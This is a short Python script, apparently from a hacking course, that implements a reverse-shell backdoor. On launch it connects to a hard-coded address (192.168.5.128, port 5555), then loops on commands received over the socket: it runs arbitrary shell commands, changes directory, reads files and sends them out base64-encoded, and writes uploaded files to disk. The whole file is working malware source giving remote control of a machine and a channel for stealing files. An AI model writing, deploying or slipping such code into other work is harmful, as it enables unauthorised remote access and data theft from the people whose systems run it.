#!/usr/bin/env python
import socket, subprocess, json, os 
import base64 
import sys
 
class Backdoor:
    def __init__(self, ip, port):
      self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.connection.connect((ip, port))
 
    def reliable_send(self, data):
      json_data = json.dumps(data)
      self.connection.send(json_data.encode())
 
    def reliable_recieve(self): 
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024) #Bytes  
                return json.loads(json_data)   
                
            except ValueError: 
                continue
 
    def change_working_directory(self, path): 
        os.chdir(path) 
        return "---> Changing working directory to " + path 

    def read_file(self, path): 
        with open(path, "rb") as file: 
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file: #need to read as a binary.
            file.write(base64.b64decode(content))
            return "====>Upload successful<====" 

    def system_command(self, command):  
        try:
            return subprocess.check_output(command, shell= True) 
        except subprocess.CalledProcessError: 
            return "Error"
 
    def run(self):
        while True:
            command = self.reliable_recieve()  
            try:
                if command[0] == "exit": 
                    self.connection.close() 
                    sys.exit()  

                elif command[0] == "cd" and len(command) > 1: 
                    command_result = self.change_working_directory(command[1])   
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode() #research more. 
                elif command[0] == "upload" : 
                    command_result = self.write_file(command[1], command[2])  #call write and content. 
                else:
                    command_result = self.system_command(command).decode() 
                print(command_result)
                self.reliable_send(command_result) 
            except Exception: 
                command_result = "Error during command execution"  

 
my_backdoor = Backdoor("192.168.5.128", 5555)
my_backdoor.run() 
